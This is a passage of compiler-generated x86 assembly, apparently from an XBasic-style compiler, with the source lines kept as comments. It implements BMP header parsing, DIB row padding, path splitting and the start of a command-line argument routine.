	mov	ebx,d[ebp-80]			;;; i665
	shl	ebx,8			;;; i835
	or	eax,ebx			;;; i763
	mov	ebx,d[ebp-76]			;;; i665
	or	eax,ebx			;;; i763
	mov	d[ebp-92],eax			;;; i670
;
; [3002] '
;
; [3003] info = 14
#ifdef GetImageArrayInfo.info
#undef GetImageArrayInfo.info
#endif
#define GetImageArrayInfo.info ebp-96	; exposes local variable 'info'
;
	mov	eax,14			;;; i659
	mov	d[ebp-96],eax			;;; i670
;
; [3004] '
;
; [3005] IF (headerSize = 12) THEN' BITMAPCOREINFO
	mov	eax,d[ebp-92]			;;; i665
	cmp	eax,12			;;; i684a
	jne	>> else.0125.server			;;; i219
;
; [3006] w0 = image[info+4]
#ifdef GetImageArrayInfo.w0
#undef GetImageArrayInfo.w0
#endif
#define GetImageArrayInfo.w0 ebp-100	; exposes local variable 'w0'
;
	mov	eax,d[ebp-96]			;;; i665
	add	eax,4			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-100],eax			;;; i670
;
; [3007] w1 = image[info+5]
#ifdef GetImageArrayInfo.w1
#undef GetImageArrayInfo.w1
#endif
#define GetImageArrayInfo.w1 ebp-104	; exposes local variable 'w1'
;
	mov	eax,d[ebp-96]			;;; i665
	add	eax,5			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-104],eax			;;; i670
;
; [3008] h0 = image[info+6]
#ifdef GetImageArrayInfo.h0
#undef GetImageArrayInfo.h0
#endif
#define GetImageArrayInfo.h0 ebp-108	; exposes local variable 'h0'
;
	mov	eax,d[ebp-96]			;;; i665
	add	eax,6			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-108],eax			;;; i670
;
; [3009] h1 = image[info+7]
#ifdef GetImageArrayInfo.h1
#undef GetImageArrayInfo.h1
#endif
#define GetImageArrayInfo.h1 ebp-112	; exposes local variable 'h1'
;
	mov	eax,d[ebp-96]			;;; i665
	add	eax,7			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-112],eax			;;; i670
;
; [3010] b0 = image[info+10]
#ifdef GetImageArrayInfo.b0
#undef GetImageArrayInfo.b0
#endif
#define GetImageArrayInfo.b0 ebp-116	; exposes local variable 'b0'
;
	mov	eax,d[ebp-96]			;;; i665
	add	eax,10			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-116],eax			;;; i670
;
; [3011] b1 = image[info+11]
#ifdef GetImageArrayInfo.b1
#undef GetImageArrayInfo.b1
#endif
#define GetImageArrayInfo.b1 ebp-120	; exposes local variable 'b1'
;
	mov	eax,d[ebp-96]			;;; i665
	add	eax,11			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-120],eax			;;; i670
;
; [3012] width = (w1 << 8) OR w0
	mov	eax,d[ebp-104]			;;; i665
	shl	eax,8			;;; i835
	mov	ebx,d[ebp-100]			;;; i665
	or	eax,ebx			;;; i763
	mov	d[ebp+16],eax			;;; i670
;
; [3013] height = (h1 << 8) OR h0
	mov	eax,d[ebp-112]			;;; i665
	shl	eax,8			;;; i835
	mov	ebx,d[ebp-108]			;;; i665
	or	eax,ebx			;;; i763
	mov	d[ebp+20],eax			;;; i670
;
; [3014] bpp = (b1 << 8) OR b0
	mov	eax,d[ebp-120]			;;; i665
	shl	eax,8			;;; i835
	mov	ebx,d[ebp-116]			;;; i665
	or	eax,ebx			;;; i763
	mov	d[ebp+12],eax			;;; i670
;
; [3015] ELSE' BITMAPINFO
	jmp	end.if.0125.server			;;; i107
else.0125.server:
;
; [3016] w0 = image[info+4]
	mov	eax,d[ebp-96]			;;; i665
	add	eax,4			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-100],eax			;;; i670
;
; [3017] w1 = image[info+5]
	mov	eax,d[ebp-96]			;;; i665
	add	eax,5			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-104],eax			;;; i670
;
; [3018] w2 = image[info+6]
#ifdef GetImageArrayInfo.w2
#undef GetImageArrayInfo.w2
#endif
#define GetImageArrayInfo.w2 ebp-124	; exposes local variable 'w2'
;
	mov	eax,d[ebp-96]			;;; i665
	add	eax,6			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-124],eax			;;; i670
;
; [3019] w3 = image[info+7]
#ifdef GetImageArrayInfo.w3
#undef GetImageArrayInfo.w3
#endif
#define GetImageArrayInfo.w3 ebp-128	; exposes local variable 'w3'
;
	mov	eax,d[ebp-96]			;;; i665
	add	eax,7			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-128],eax			;;; i670
;
; [3020] h0 = image[info+8]
	mov	eax,d[ebp-96]			;;; i665
	add	eax,8			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-108],eax			;;; i670
;
; [3021] h1 = image[info+9]
	mov	eax,d[ebp-96]			;;; i665
	add	eax,9			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-112],eax			;;; i670
;
; [3022] h2 = image[info+10]
#ifdef GetImageArrayInfo.h2
#undef GetImageArrayInfo.h2
#endif
#define GetImageArrayInfo.h2 ebp-132	; exposes local variable 'h2'
;
	mov	eax,d[ebp-96]			;;; i665
	add	eax,10			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-132],eax			;;; i670
;
; [3023] h3 = image[info+11]
#ifdef GetImageArrayInfo.h3
#undef GetImageArrayInfo.h3
#endif
#define GetImageArrayInfo.h3 ebp-136	; exposes local variable 'h3'
;
	mov	eax,d[ebp-96]			;;; i665
	add	eax,11			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-136],eax			;;; i670
;
; [3024] b0 = image[info+14]
	mov	eax,d[ebp-96]			;;; i665
	add	eax,14			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-116],eax			;;; i670
;
; [3025] b1 = image[info+15]
	mov	eax,d[ebp-96]			;;; i665
	add	eax,15			;;; i775
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[ebp-120],eax			;;; i670
;
; [3026] width = (w3 << 24) OR (w2 << 16) OR (w1 << 8) OR w0
	mov	eax,d[ebp-128]			;;; i665
	shl	eax,24			;;; i835
	mov	ebx,d[ebp-124]			;;; i665
	shl	ebx,16			;;; i835
	or	eax,ebx			;;; i763
	mov	ebx,d[ebp-104]			;;; i665
	shl	ebx,8			;;; i835
	or	eax,ebx			;;; i763
	mov	ebx,d[ebp-100]			;;; i665
	or	eax,ebx			;;; i763
	mov	d[ebp+16],eax			;;; i670
;
; [3027] height = (h3 << 24) OR (h2 << 16) OR (h1 << 8) OR h0
	mov	eax,d[ebp-136]			;;; i665
	shl	eax,24			;;; i835
	mov	ebx,d[ebp-132]			;;; i665
	shl	ebx,16			;;; i835
	or	eax,ebx			;;; i763
	mov	ebx,d[ebp-112]			;;; i665
	shl	ebx,8			;;; i835
	or	eax,ebx			;;; i763
	mov	ebx,d[ebp-108]			;;; i665
	or	eax,ebx			;;; i763
	mov	d[ebp+20],eax			;;; i670
;
; [3028] bpp = (b1 << 8) OR b0
	mov	eax,d[ebp-120]			;;; i665
	shl	eax,8			;;; i835
	mov	ebx,d[ebp-116]			;;; i665
	or	eax,ebx			;;; i763
	mov	d[ebp+12],eax			;;; i670
;
; [3029] END IF
end.if.0125.server:
;
; [3031] RETURN ($$TRUE)
	mov	eax,-1			;;; i659
	jmp	end.func40.server			;;; i258
;
; [3033] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetImageArrayInfo.server:  ;;; Function end label for Assembly Programmers.
end.func40.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetImageArrayInfo ()  *****
;  *****
;
; [3035] FUNCTION IJL_DIB_PAD_BYTES (width)
.code
;
#ifdef IJL_DIB_PAD_BYTES.width
#undef IJL_DIB_PAD_BYTES.width
#endif
#define IJL_DIB_PAD_BYTES.width ebp+8	; exposes function argument 'width'
;
align 16
_IJL_DIB_PAD_BYTES.server@4:
;  *****
;  *****  FUNCTION  IJL_DIB_PAD_BYTES ()  *****
;  *****
func45.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,200			;;; i114a
;
funcBody45.server:
;
; [3037] lineWidth = width * 3
#ifdef IJL_DIB_PAD_BYTES.lineWidth
#undef IJL_DIB_PAD_BYTES.lineWidth
#endif
#define IJL_DIB_PAD_BYTES.lineWidth ebp-40	; exposes local variable 'lineWidth'
;
	mov	eax,d[ebp+8]			;;; i665
	imul	eax,3			;;; i805
	mov	d[ebp-40],eax			;;; i670
;
; [3038] RETURN ((lineWidth + 3) AND (NOT (3))) - lineWidth
	mov	eax,d[ebp-40]			;;; i665
	add	eax,3			;;; i775
	mov	ebx,3			;;; i659
	not	ebx			;;; i923
	and	eax,ebx			;;; i769
	mov	ebx,d[ebp-40]			;;; i665
	sub	eax,ebx			;;; i791
	jmp	end.func45.server			;;; i258
;
; [3040] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.IJL_DIB_PAD_BYTES.server:  ;;; Function end label for Assembly Programmers.
end.func45.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  IJL_DIB_PAD_BYTES ()  *****
;  *****
;
; [3043] FUNCTION getLastSlash(str$, stop)
.code
;
#ifdef getLastSlash.str$
#undef getLastSlash.str$
#endif
#define getLastSlash.str$ ebp+8	; exposes function argument 'str$'
;
;
#ifdef getLastSlash.stop
#undef getLastSlash.stop
#endif
#define getLastSlash.stop ebp+12	; exposes function argument 'stop'
;
align 16
_getLastSlash.server@8:
;  *****
;  *****  FUNCTION  getLastSlash ()  *****
;  *****
func61.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody61.server:
;
; [3044] $PathSlash$   = "\\"
;
; [3047] IF stop < 0 THEN
	mov	eax,d[ebp+12]			;;; i665
	cmp	eax,0			;;; i684a
	jge	>> else.0126.server			;;; i219
;
; [3048] slash1 = RINSTR(str$, "/")
#ifdef getLastSlash.slash1
#undef getLastSlash.slash1
#endif
#define getLastSlash.slash1 ebp-40	; exposes local variable 'slash1'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.02C7.server			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_rinstr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-40],eax			;;; i670
;
; [3049] slash2 = RINSTR(str$, $PathSlash$)
#ifdef getLastSlash.slash2
#undef getLastSlash.slash2
#endif
#define getLastSlash.slash2 ebp-44	; exposes local variable 'slash2'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.02CD.server			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_rinstr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-44],eax			;;; i670
;
; [3050] ELSE
	jmp	end.if.0126.server			;;; i107
else.0126.server:
;
; [3051] slash1 = RINSTR(str$, "/", stop)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.02C7.server			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	eax,d[ebp+12]			;;; i665
	mov	d[esp+8],eax			;;; i887
	call	%_rinstr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-40],eax			;;; i670
;
; [3052] slash2 = RINSTR(str$, $PathSlash$, stop)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.02CD.server			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	eax,d[ebp+12]			;;; i665
	mov	d[esp+8],eax			;;; i887
	call	%_rinstr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-44],eax			;;; i670
;
; [3053] END IF
end.if.0126.server:
;
; [3054] IFZ slash1 THEN
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0127.server			;;; i195
;
; [3055] RETURN slash2
	mov	eax,d[ebp-44]			;;; i665
	jmp	end.func61.server			;;; i258
;
; [3056] ELSE
	jmp	end.if.0127.server			;;; i107
else.0127.server:
;
; [3057] RETURN MAX(slash1, slash2)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_MAX.xlong
	add	esp,64			;;; i600
	jmp	end.func61.server			;;; i258
;
; [3058] END IF
end.if.0127.server:
;
; [3060] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.getLastSlash.server:  ;;; Function end label for Assembly Programmers.
end.func61.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  getLastSlash ()  *****
;  *****
;
; [3062] FUNCTION DecomposePathname (pathname$, @path$, @parent$, @filename$, @file$, @extent$)
.code
;
#ifdef DecomposePathname.pathname$
#undef DecomposePathname.pathname$
#endif
#define DecomposePathname.pathname$ ebp+8	; exposes function argument 'pathname$'
;
;
#ifdef DecomposePathname.path$
#undef DecomposePathname.path$
#endif
#define DecomposePathname.path$ ebp+12	; exposes function argument 'path$'
;
;
#ifdef DecomposePathname.parent$
#undef DecomposePathname.parent$
#endif
#define DecomposePathname.parent$ ebp+16	; exposes function argument 'parent$'
;
;
#ifdef DecomposePathname.filename$
#undef DecomposePathname.filename$
#endif
#define DecomposePathname.filename$ ebp+20	; exposes function argument 'filename$'
;
;
#ifdef DecomposePathname.file$
#undef DecomposePathname.file$
#endif
#define DecomposePathname.file$ ebp+24	; exposes function argument 'file$'
;
;
#ifdef DecomposePathname.extent$
#undef DecomposePathname.extent$
#endif
#define DecomposePathname.extent$ ebp+28	; exposes function argument 'extent$'
;
align 16
_DecomposePathname.server@24:
;  *****
;  *****  FUNCTION  DecomposePathname ()  *****
;  *****
func60.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func60.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.444:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.444			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,180			;;; i114a
;
funcBody60.server:
;
; [3063] '
;
; [3064] path$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3065] file$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+24]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3066] extent$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+28]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3067] parent$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+16]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3068] filename$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+20]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3069] name$ = TRIM$ (pathname$)
#ifdef DecomposePathname.name$
#undef DecomposePathname.name$
#endif
#define DecomposePathname.name$ ebp-40	; exposes local variable 'name$'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_trim.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3070] dot = RINSTR (name$, ".")
#ifdef DecomposePathname.dot
#undef DecomposePathname.dot
#endif
#define DecomposePathname.dot ebp-44	; exposes local variable 'dot'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.02C5.server			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_rinstr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-44],eax			;;; i670
;
; [3071] slash = getLastSlash(name$, -1)
#ifdef DecomposePathname.slash
#undef DecomposePathname.slash
#endif
#define DecomposePathname.slash ebp-48	; exposes local variable 'slash'
;
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk60.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	push	eax			;;; i667a
	push	[ebp-56]			;;; i674a
	call	func61.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
	mov	d[ebp-48],eax			;;; i670
;
; [3073] IF slash THEN preslash = getLastSlash(name$, slash-1)
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0128.server			;;; i221
#ifdef DecomposePathname.preslash
#undef DecomposePathname.preslash
#endif
#define DecomposePathname.preslash ebp-60	; exposes local variable 'preslash'
;
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,1			;;; i791
	push	eax			;;; i667a
	push	[ebp-56]			;;; i674a
	call	func61.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
	mov	d[ebp-60],eax			;;; i670
else.0128.server:
end.if.0128.server:
;
; [3074] IF (dot < slash) THEN dot = 0
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jge	>> else.0129.server			;;; i219
	mov	eax,0			;;; i659
	mov	d[ebp-44],eax			;;; i670
else.0129.server:
end.if.0129.server:
;
; [3075] '
;
; [3076] filename$ = MID$ (name$, slash+1)' filename = "name.ext"
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	add	eax,1			;;; i775
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],2147483647			;;; i579
	call	%_mid.d.v			;;; i580
	add	esp,64			;;; i600
	lea	ebx,[ebp+20]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3077] IFZ dot THEN
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.012A.server			;;; i195
;
; [3078] file$ = filename$' file = filename (filename has no extent)
	mov	eax,[ebp+20]			;;; i665
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp+24]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3079] ELSE
	jmp	end.if.012A.server			;;; i107
else.012A.server:
;
; [3080] file$ = MID$ (name$, slash+1, dot-slash-1)' file = "name" (without extent)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	add	eax,1			;;; i775
	mov	d[esp+4],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	sub	eax,ebx			;;; i791
	sub	eax,1			;;; i791
	mov	d[esp+8],eax			;;; i887
	call	%_mid.d.v			;;; i580
	add	esp,64			;;; i600
	lea	ebx,[ebp+24]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3081] extent$ = MID$ (name$, dot)' extent = ".ext"
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],2147483647			;;; i579
	call	%_mid.d.v			;;; i580
	add	esp,64			;;; i600
	lea	ebx,[ebp+28]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3082] END IF
end.if.012A.server:
;
; [3083] '
;
; [3084] IF slash THEN
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.012B.server			;;; i221
;
; [3085] path$ = LEFT$ (name$, slash-1)' path = full pathname to left of "/file.ext"
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,1			;;; i791
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3086] IF preslash THEN
	mov	eax,d[ebp-60]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.012C.server			;;; i221
;
; [3087] parent$ = MID$ (name$, preslash+1, slash-preslash-1)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-60]			;;; i665
	add	eax,1			;;; i775
	mov	d[esp+4],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-60]			;;; i665
	sub	eax,ebx			;;; i791
	sub	eax,1			;;; i791
	mov	d[esp+8],eax			;;; i887
	call	%_mid.d.v			;;; i580
	add	esp,64			;;; i600
	lea	ebx,[ebp+16]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3088] ELSE
	jmp	end.if.012C.server			;;; i107
else.012C.server:
;
; [3089] parent$ = LEFT$ (name$, slash-1)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,1			;;; i791
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	lea	ebx,[ebp+16]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3090] END IF
end.if.012C.server:
;
; [3091] END IF
else.012B.server:
end.if.012B.server:
;
; [3093] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.DecomposePathname.server:  ;;; Function end label for Assembly Programmers.
end.func60.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func60.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	24			;;; i111a
free.func60.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  DecomposePathname ()  *****
;  *****
;
; [3095] FUNCTION GetCommandLineArguments (argc, argv$[])
.code
;
#ifdef GetCommandLineArguments.argc
#undef GetCommandLineArguments.argc
#endif
#define GetCommandLineArguments.argc ebp+8	; exposes function argument 'argc'
;
;
#ifdef GetCommandLineArguments.argv$
#undef GetCommandLineArguments.argv$
#endif
#define GetCommandLineArguments.argv$ ebp+12	; exposes function argument 'argv$'
;
align 16
_GetCommandLineArguments.server@8:
;  *****
;  *****  FUNCTION  GetCommandLineArguments ()  *****
;  *****
func5F.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func5F.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.453:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.453			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,140			;;; i114a
;
funcBody5F.server:
;
; [3096] SHARED  setarg
data section 'globals$shared'
align	4
%setarg.server:	db 4 dup ?
.code
;
; [3097] SHARED  setargc
data section 'globals$shared'
align	4
%setargc.server:	db 4 dup ?
.code
;
; [3098] SHARED  setargv$[]
data section 'globals$shared'
align	4
%%%setargv$.server:	db 4 dup ?
.code
;
; [3101] DIM argv$[]
	sub	esp,64			;;; i430
	mov	esi,d[ebp+12]			;;; i665
	call	%_FreeArray			;;; i431
	mov	esi,0			;;; i666
	mov	d[ebp+12],esi			;;; i670
	add	esp,64
;
; [3102] inc = argc
#ifdef GetCommandLineArguments.inc
#undef GetCommandLineArguments.inc
#endif
#define GetCommandLineArguments.inc ebp-40	; exposes local variable 'inc'
;
	mov	eax,d[ebp+8]			;;; i665
	mov	d[ebp-40],eax			;;; i670
;
; [3103] argc = 0
	mov	eax,0			;;; i659
	mov	d[ebp+8],eax			;;; i670
;
; [3104] '
;
; [3105] ' return already set argc and argv$[]
;
; [3106] '
;
; [3107] IF (inc >= 0) THEN
	mov	eax,d[ebp-40]			;;; i665
	cmp	eax,0			;;; i684a
	jl	>> else.012D.server			;;; i219
;
; [3108] IF setarg THEN
	mov	eax,d[%setarg.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.012E.server			;;; i221
;
; [3109] argc = setargc
	mov	eax,d[%setargc.server]			;;; i663a
	mov	d[ebp+8],eax			;;; i670
;
